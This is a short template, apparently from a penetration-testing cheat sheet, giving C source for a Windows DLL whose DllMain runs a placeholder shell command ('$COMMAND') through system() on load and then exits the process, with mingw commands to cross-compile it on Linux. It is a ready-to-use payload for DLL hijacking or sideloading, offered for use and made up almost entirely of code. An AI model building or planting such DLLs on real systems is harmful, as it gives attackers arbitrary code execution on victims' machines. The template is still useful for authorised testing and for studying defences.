# Windows DLL Source

The following C source code will run `$COMMAND`.

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("$COMMAND");
        ExitProcess(0);
    }
    return TRUE;
}
```

For x64 compile (on Linux) with:

```bash
# apt install gcc-mingw-w64
x86_64-w64-mingw32-gcc source.c -shared -o $OUTPUT_FILE
```

For x86 compile (on Linux) with:

```bash
# apt install gcc-mingw-w64
i686-w64-mingw32-gcc source.c -shared -o $OUTPUT_FILE
```
